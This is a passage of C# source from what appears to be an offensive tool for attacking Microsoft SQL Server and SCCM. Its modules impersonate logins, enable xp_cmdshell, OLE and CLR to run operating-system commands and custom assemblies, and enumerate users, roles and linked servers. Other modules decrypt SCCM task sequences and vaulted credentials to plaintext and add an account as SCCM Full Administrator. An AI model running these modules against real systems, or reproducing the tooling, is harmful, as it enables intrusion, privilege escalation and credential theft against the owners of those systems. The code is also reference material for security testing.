            _print.Status(string.Format("Displaying columns from '{0}' in '{2}' as '{1}' on {3}", 
                _arg2, _impersonate, _arg1, _sqlServer), true);
                
            _query = "use " + _arg1 + ";" +
                "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS " +
                "WHERE TABLE_NAME = '" + _arg2 + "' ORDER BY ORDINAL_POSITION;";

            _print.IsOutputEmpty(_sqlQuery.ExecuteImpersonationCustomQuery(
                _connection, _impersonate, _query), true);
        }

        /// <summary>
        /// The iclr method is used in conjunction with an account that can be
        /// impersonated to execute custom .NET CLR assemblies.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void iclr()
        {
            _print.Status(string.Format("Performing CLR custom assembly attack as '{0}' on {1}",
                _impersonate, _sqlServer), true);
            _clr.Impersonate(_connection, _arg1, _arg2, _impersonate);
        }

        /// <summary>
        /// The idatabases method is used in conjunction with an account that can be
        /// impersonated to show all configured databases.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void idatabases()
        {
            _print.Status(string.Format("Databases on {0}", _sqlServer), true);
            
            _query = "SELECT dbid, name, crdate, filename FROM master.dbo.sysdatabases;";
            
            Console.WriteLine(_sqlQuery.ExecuteImpersonationCustomQuery(
                _connection, _impersonate, _query));
        }

        /// <summary>
        /// The idisableclr method is used in conjunction with an account that can be
        /// impersonated to disable CLR integration.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void idisableclr()
        {
            _print.Status(string.Format("Disabling CLR Integration as '{0}' on {1}",
                _impersonate, _sqlServer), true);
            _config.ModuleToggle(_connection, "clr enabled", "0", _sqlServer, _impersonate);
        }

        /// <summary>
        /// The idisableole method is used in conjunction with an account that can be
        /// impersonated to disable OLE automation.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void idisableole()
        {
            _print.Status(string.Format("Disabling Ole Automation Procedures as '{0}' on {1}",
                _impersonate, _sqlServer), true);
            _config.ModuleToggle(_connection, "Ole Automation Procedures", "0",
                _sqlServer, _impersonate);
        }

        /// <summary>
        /// The idisablerpc method is used against the initial SQL server to
        /// disable 'rpc out' on a specified SQL server with an account that can be
        /// impersonated.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void idisablerpc()
        {
            _print.Status(string.Format("Disabling RPC on {0}", _arg1), true);
            _config.ModuleToggle(_connection, "rpc", "false", _arg1, _impersonate);
        }

        /// <summary>
        /// The idisablexp method is used in conjunction with an account that can be
        /// impersonated to disable xp_cmdshell.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void idisablexp()
        {
            _print.Status(string.Format("Disabling xp_cmdshell as '{0}' on {1}",
                _impersonate, _sqlServer), true);
            _config.ModuleToggle(_connection, "xp_cmdshell", "0", _sqlServer, _impersonate);
        }

        /// <summary>
        /// The ienableclr method is used in conjunction with an account that can be
        /// impersonated to enable CLR integration.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void ienableclr()
        {
            _print.Status(string.Format("Enabling CLR Integration as '{0}' on {1}",
                _impersonate, _sqlServer), true);
            _config.ModuleToggle(_connection, "clr enabled", "1", _sqlServer, _impersonate);
        }

        /// <summary>
        /// The ienableole method is used in conjunction with an account that can be
        /// impersonated to enable OLE automation.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void ienableole()
        {
            _print.Status(string.Format("Enabling Ole Automation Procedures as '{0}' on {1}",
                _impersonate, _sqlServer), true);
            _config.ModuleToggle(_connection, "Ole Automation Procedures", "1",
                _sqlServer, _impersonate);
        }

        /// <summary>
        /// The ienablerpc method is used against the initial SQL server to
        /// enable 'rpc out' on a specified SQL server with an account that can be
        /// impersonated.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void ienablerpc()
        {
            _print.Status(string.Format("Enabling RPC on {0}", _arg1), true);
            _config.ModuleToggle(_connection, "rpc", "true", _arg1, _impersonate);
        }

        /// <summary>
        /// The ienablexp method is used in conjunction with an account that can be
        /// impersonated to enable xp_cmdshell.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void ienablexp()
        {
            _print.Status(string.Format("Enabling xp_cmdshell as '{0}' on {1}",
                _impersonate, _sqlServer), true);
            _config.ModuleToggle(_connection, "xp_cmdshell", "1", _sqlServer, _impersonate);
        }


        /// <summary>
        /// The ilinks method is used in conjunction with an account that can be
        /// impersonated to determine if the remote SQL server has a link configured
        /// to other SQL servers.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void ilinks()
        {
            _print.Status(string.Format("Obtaining additional SQL links on {0} as '{1}'",
                _sqlServer, _impersonate), true);
            _query = "SELECT name, product, provider, data_source FROM " +
                "sys.servers WHERE is_linked = 1;";
            _print.IsOutputEmpty(_sqlQuery.ExecuteImpersonationCustomQuery(
                _connection, _impersonate, _query), true);
        }

        /// <summary>
        /// The iolecmd method is used in conjunction with an account that can be
        /// impersonated to execute a user supplied command.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void iolecmd()
        {
            _print.Status(string.Format("Executing '{0}' as '{1}' on {2}",
                _arg1, _impersonate, _sqlServer), true);
            _ole.Impersonate(_connection, _arg1, _impersonate);
        }

        /// <summary>
        /// The iquery method is used in conjunction with an account that can be
        /// impersonated to execute a user supplied SQL query.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void iquery()
        {
            _print.Status(string.Format("Executing '{0}' as '{1}' on {2}",
                _arg1, _impersonate, _sqlServer), true);
            _print.IsOutputEmpty(_sqlQuery.ExecuteImpersonationCustomQuery(
                _connection, _impersonate, _arg1), true);
        }

        /// <summary>
        /// The irows method is used in conjunction with an account that can be
        /// impersonated to determine the number of rows in a table.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name. 
        /// </summary>
        public static void irows()
        {
            _print.Status(string.Format("Displaying number of rows from '{0}' in '{2}' as '{1}' on {3}",
                _arg2, _impersonate, _arg1, _sqlServer), true);

            _query = "use " + _arg1 + ";" +
                "SELECT COUNT(*) as row_count FROM " + _arg2 + ";";

            _print.IsOutputEmpty(_sqlQuery.ExecuteImpersonationCustomQuery(
                _connection, _impersonate, _query), true);
        }

        /// <summary>
        /// The isearch method is used in conjunction with an account that can be
        /// impersonated to search a table for a specific column name.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void isearch()
        {
            _print.Status(string.Format("Searching for columns containing '{0}' as '{1}' in {2}",
                _arg1, _impersonate, _database), true);
            _query = "SELECT table_name, column_name " +
                "FROM INFORMATION_SCHEMA.COLUMNS WHERE column_name LIKE '%" + _arg1 + "%';";
            _print.IsOutputEmpty(_sqlQuery.ExecuteImpersonationCustomQuery(
                _connection, _impersonate, _query), true);
        }

        /// <summary>
        /// The itables method is used in conjunction with an account that can be
        /// impersonated to retrieve the tables from the user supplied database.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void itables()
        {
            _print.Status(string.Format("Displaying Tables in {0} as '{1}'",
                _arg1, _impersonate), true);
            _query = "SELECT * FROM " + _arg1 + ".INFORMATION_SCHEMA.TABLES;";
            _print.IsOutputEmpty(_sqlQuery.ExecuteImpersonationCustomQuery(
                _connection, _impersonate, _query), true);
        }

        /// <summary>
        /// The iusers method is used in conjunction with an account that can be
        /// impersonated to obtain local users in the SQL instance.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void iusers()
        {
            _print.Status(string.Format("Getting users in the '{0}' database on {1} as '{2}'",
                _database, _sqlServer, _impersonate), true);
            _query = "SELECT name AS username, create_date, " +
                "modify_date, type_desc AS type, authentication_type_desc AS " +
                "authentication_type FROM sys.database_principals WHERE type " +
                "NOT IN ('A', 'R', 'X') AND sid IS NOT null ORDER BY username;";
            Console.WriteLine(_sqlQuery.ExecuteImpersonationCustomQuery(
                _connection, _impersonate, _query));
        }

        /// <summary>
        /// The iwhoami method is used in conjunction with an account that can be
        /// impersonated to determine the current users level of access.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void iwhoami()
        {
            _print.Status(string.Format("Determining user permissions on {0} as '{1}'",
                _sqlServer, _impersonate), true);

            _query = "SELECT SYSTEM_USER;";
            _print.Status(string.Format("Logged in as {0}", _sqlQuery.ExecuteImpersonationQuery(
                _connection, _impersonate, _query)), true);


            _query = "SELECT USER_NAME();";
            _print.Status(string.Format("Mapped to the user {0}", _sqlQuery.ExecuteImpersonationQuery(
                _connection, _impersonate, _query)), true);

            _print.Status("[+] Roles:", true);

            // This SQL command extracts all of the observable roles which are present in the current database
            // "select name from sys.database_principals where type = 'R'" also works.
            _query = "SELECT [name] FROM sysusers WHERE issqlrole = 1;";
            string GetRoles = _sqlQuery.ExecuteImpersonationCustomQuery(_connection, _impersonate, _query);

            // Get rid of the first two elements, which will be "name" and "-------".
            string[] RolesArr = GetRoles.TrimStart('\n').Replace(" |", "").Split('\n').Skip(2).ToArray();

            // These are the default MS SQL database roles.
            string[] DefaultRoles = { "sysadmin", "setupadmin", "serveradmin",
                    "securityadmin", "processadmin", "diskadmin", "dbcreator", "bulkadmin" };

            string[] CombinedRoles = RolesArr.Concat(DefaultRoles).ToArray();

            // Test to see if the current principal is a member of any roles.
            foreach (var Item in CombinedRoles)
            {
                _roles.CheckImpersonatedRole(_connection, Item.Trim(), _impersonate, true);
            }
        }

        /// <summary>
        /// The ixpcmd method is used in conjunction with an account that can be
        /// impersonated to execute a user supplied command.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void ixpcmd()
        {
            _print.Status(string.Format("Executing '{0}' as '{1}' on {2}.", 
                _arg1, _impersonate, _sqlServer), true);
            _xpCmdShell.Impersonate(_connection, _arg1, _impersonate);
        }

        /*
         * *************************************************************
         * *************************************************************
         * *************************************************************
         * ****************** SCCM SQL Server Modules ******************
         * *************************************************************
         * *************************************************************
         * *************************************************************
         */

        /// <summary>
        /// The susers method lists all users in the RBAC_Admins table.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void susers()
        {
            _sccm.SccmUsers(_connection);
        }

        /// <summary>
        /// The ssites method lists all sites stored in the SCCM databases' 'DPInfo' table.
        /// This can provide additional attack avenues as different sites 
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void ssites()
        {
            _sccm.SccmSites(_connection);
        }

        /// <summary>
        /// The SccmClientLogons method queries the 'Computer_System_DATA' table to 
        /// retrieve all associated SCCM clients along with the user that last logged into them.
        /// NOTE: This only updates once a week by default and will not be 100% up to date.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void slogons()
        {
            _sccm.SccmClientLogons(_connection, _arg0);
        }

        /// <summary>
        /// The stasklist method provides a list of all task sequences stored
        /// in the SCCM database, but does not access the actual task data contents.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void stasklist()
        {
            _sccm.SccmTaskSequenceList(_connection);
        }

        /// <summary>
        /// The staskdata method recovers all task sequences stored in the SCCM
        /// database and decrypts them to plaintext.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void staskdata()
        {
            _sccm.GetTaskSequenceData(_connection);
        }

        /// <summary>
        /// The scredentials method lists credentials vaulted by SCCM for
        /// use in various functions. These credentials can not be remotely decrypted
        /// as the key is stored on the SCCM server. However, this module provides
        /// intel on if it makes sense to attempt to obtain the key.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void scredentials()
        {
            _sccm.TriageVaultedCredentials(_connection);
        }

        /// <summary>
        /// The sdecryptcredentials method recovers encrypted credential string
        /// for accounts vaulted in SCCM and attempts to use the Microsoft Systems Management Server CSP 
        /// to attempt to decrypt them to plaintext. Uses the logic from @XPN's initial PoC SCCM secret decryption gist:
        /// https://gist.github.com/xpn/5f497d2725a041922c427c3aaa3b37d1
        /// This function must be ran from an SCCM management server in a context
        /// that has the ability to access this CSP (high-integrity admin or SYSTEM).
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void sdecryptcredentials()
        {
            _sccm.DecryptVaultedCredentials(_connection);
        }

        /// <summary>
        /// The AddSCCMAdmin method will elevate the specified account to a 'Full Administrator'
        /// within SCCM. If target user is already an SCCM user, this module will instead add necessary
        /// privileges to elevate. This module require sysadmin or similar privileges as writing to 
        /// SCCM database tables is required.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void saddadmin()
        {
            _sccm.AddSCCMAdmin(_connection, _arg1, _arg2);
        }

        /// <summary>
        /// The RemoveSCCMAdmin method removes the privileges of a user by removing a user
        /// entirely from the SCCM database. Use the arguments provided by output of the 
        /// AddSCCMAdmin command to run this command. This module require sysadmin or 
        /// similar privileges as writing to SCCM database tables is required.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void sremoveadmin()
        {
            _sccm.RemoveSCCMAdmin(_connection, _arg1, _arg2);
        }
    }
}